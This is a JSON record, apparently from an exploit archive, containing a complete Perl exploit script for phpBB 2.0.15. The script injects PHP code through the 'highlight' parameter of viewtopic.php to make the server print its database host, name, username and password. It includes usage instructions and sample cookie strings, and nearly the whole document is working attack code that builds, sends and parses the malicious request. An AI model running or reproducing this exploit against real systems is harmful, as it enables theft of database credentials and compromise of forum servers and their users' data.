{
  "id": "1080",
  "title": "phpBB 2.0.15 - &#039;highlight&#039; Database Authentication Details",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n# tested and working /str0ke\r\n\r\n#        ********************************************************************\r\n#       **********************************************************************\r\n#      ****                                                                 **\r\n#     ***      ******       *******************                             **\r\n#    ***    ***   ****   ***********************                            **\r\n#   ***   ***     ****                       ****      *   ***    *****     **\r\n#  ***   ***      ***                ***     ***      *  **  **   **        **\r\n# ***   ***                         ***      **         **   **  **         **\r\n#***   ***                          ***    ***          **   **  *****      **\r\n#**   ***                          ***  ****           **   **      **      **\r\n#**   ***       ***  ***   ******* *******             **  ***      **      **\r\n#**   ***      ***   ***  **      *** ***              **  **  **  **       **\r\n#**  ***      ***   ***  **      ***  ***               ***   *****         **\r\n#**   ***     ***   *** **       ***  ***                                   **\r\n#**   ****   ***    ****        ***   ***                                   **\r\n#**     *******    ****   ********     ***********************************  **\r\n#**         ***                                                             **\r\n#**        ***                                                              **\r\n#**                                                                         **\r\n#**      phpBB 2.0.15 Viewtopic.PHP Remote Code Execution Vulnerability     **\r\n#**      This exploit gives the user all the details about the database     **\r\n#**      connection such as database host, username, password and           **\r\n#**      database name.                                                     **\r\n#**                                                                         **\r\n#**              Written by SecureD,  gvr.secured<AT>gmail<DOT>com,2005     **\r\n#**                                                                         **\r\n#**      Greetings to GvR, Jumento, PP, CKrew & friends      \t\t        **\r\n#**                                                                         **\r\n#***************************************************************************** \r\n# ***************************************************************************\r\n\r\nuse IO::Socket;\r\n\r\nprint \"+-----------------------------------------------------------------------+\\r\\n\";\r\nprint \"|           PhpBB 2.0.15 Database Authentication Details Exploit        |\\r\\n\";\r\nprint \"|                 By SecureD gvr.secured<AT>gmail<DOT>com               |\\r\\n\";\r\nprint \"+-----------------------------------------------------------------------+\\r\\n\";\r\n\r\nif (@ARGV < 3)\r\n{\r\nprint \"Usage:\\r\\n\";\r\nprint \"phpbbSecureD.pl SERVER DIR THREADID COOKIESTRING\\r\\n\\r\\n\";\r\nprint \"SERVER         - Server where PhpBB is installed.\\r\\n\";\r\nprint \"DIR            - PHPBB directory or / for no directory.\\r\\n\";\r\nprint \"THREADID       - Id of an existing thread.\\r\\n\";\r\nprint \"COOKIESTRING   - Optional, cookie string of the http request.\\r\\n\";\r\nprint \"                 Use this when a thread needs authentication for viewing\\r\\n\";\r\nprint \"                 You can use Firefox in combination with \\\"Live HTTP\\r\\n\";\r\nprint \"                 Headers\\\" to get this cookiestring.\\r\\n\\r\\n\";\r\nprint \"Example 1 (with cookiestring):\\r\\n\";\r\nprint \"phpbbSecured.pl 192.168.168.123 /PHPBB/ 8 \\\"phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=10dae92b780914332896df43808c4e09\\\" \\r\\n\\r\\n\";\r\nprint \"Example 2 (without cookiestring):\\r\\n\";\r\nprint \"phpbbSecured.pl 192.168.168.123 /PHPBB/ 20 \\r\\n\";\r\nexit();\r\n}\r\n\r\n$serv \t\t= $ARGV[0];\r\n$dir \t\t= $ARGV[1];\r\n$threadid \t= $ARGV[2];\r\n$cookie \t= $ARGV[3];\r\n\r\n$serv \t\t=~ s/http:\\/\\///ge;\r\n$delimit \t= \"GvRSecureD\";\r\n\r\n$sploit\t = $dir . \"viewtopic.php?t=\";\r\n$sploit .= $threadid;\r\n$sploit .= \"&highlight='.printf($delimit.\";\r\n$sploit .= \"\\$dbhost.\";\r\n$sploit .= \"$delimit.\";\r\n$sploit .= \"\\$dbname.\";\r\n$sploit .= \"$delimit.\";\r\n$sploit .= \"\\$dbuser.\";\r\n$sploit .= \"$delimit.\";\r\n$sploit .= \"\\$dbpasswd.\";\r\n$sploit .= \"$delimit).'\";\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\") or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n\r\nprint \"[+] Connecting      OK\\n\";\r\nsleep(1);\r\n\r\nprint \"[+] Sending exploit \";\r\nprint $sock \"GET $sploit HTTP/1.1\\r\\n\";\r\nprint $sock \"Host: $serv\\r\\n\";\r\nif ( defined $cookie) {\r\n\tprint $sock \"Cookie: $cookie \\r\\n\";\r\n}\r\nprint $sock \"Connection: close\\r\\n\\r\\n\";\r\n\r\n\r\n$succes = 0;\r\n\r\nwhile ($answer = <$sock>) {\r\n\t$delimitIndex = index $answer, $delimit;\r\n\tif ($delimitIndex >= 0) {\r\n\t\t$succes = 1;\r\n\t\t$urlIndex = index $answer, \"href\";\r\n\t\tif ($urlIndex < 0){\r\n\t\t\t$answer = substr($answer, length($delimit));\r\n\t\t\t$length = 0;\r\n\t\t\twhile (length($answer) > 0) {\r\n\t\t\t\t$nex = index($answer, $delimit);\r\n\t\t\t\tif ($nex > 0) {\r\n\t\t\t\t\tpush(@array, substr($answer, 0, $nex));\r\n\t\t\t\t\t$answer = substr($answer, $nex + length($delimit), length($answer));\r\n\t\t\t\t} else {\r\n\t\t\t\t\t$answer= \"\";\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nclose($sock);\r\n\r\nif ($succes == 1) {\r\n\tprint \"OK\\n\";\r\n\tsleep(1);\r\n\tprint \"[+] Database Host:  \" . $array[0] . \"\\n\";\r\n\tsleep(1);\r\n\tprint \"[+] Database Name:  \" . $array[1] . \"\\n\";\r\n\tsleep(1);\r\n\tprint \"[+] Username:       \" . $array[2] . \"\\n\";\r\n\tsleep(1);\r\n\tprint \"[+] Password:       \" . $array[3] . \"\\n\";\r\n\tsleep(1);\r\n} else {\r\n\tprint \"FAILED\\n\";\r\n}\r\n\r\n# milw0rm.com [2005-07-03]",
  "url": "https://www.exploit-db.com/exploits/1080"
}